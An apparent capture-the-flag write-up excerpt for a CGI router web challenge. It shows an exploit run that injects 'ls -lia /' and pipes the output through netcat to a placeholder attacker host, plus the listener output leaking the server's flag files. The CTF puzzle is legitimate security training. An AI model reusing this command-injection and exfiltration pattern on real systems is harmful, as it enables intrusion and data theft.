```
krouter - [1000pts]
2 solves

all those routers using cgi powered web interfaces. i made my own, can you help me spot any vulnerabilities ? i left you an important file out there

http://159.65.199.231/

Author: rekter0
```

writeup: https://r0.haxors.org/posts?id=11


```
$ python sploit.py remote 'ls -lia / | nc IP_TO_EXFILTRATE_DATA 7080'
```

```
$ nc -lnvv -p 7080
Listening on [0.0.0.0] (family 0, port 7080)
Connection from 159.65.199.231 58692 received!
total 112
[...]
 18554 -r--------   1 getflag getflag    41 Dec 27 13:21 f09aaa3423420e20eb8e9ae8418fa0c830f46d28.txt
 30038 -rwsr-xr-x   1 getflag getflag  8512 Dec 27 14:30 getflag_execute_me
[...]
[...]
```
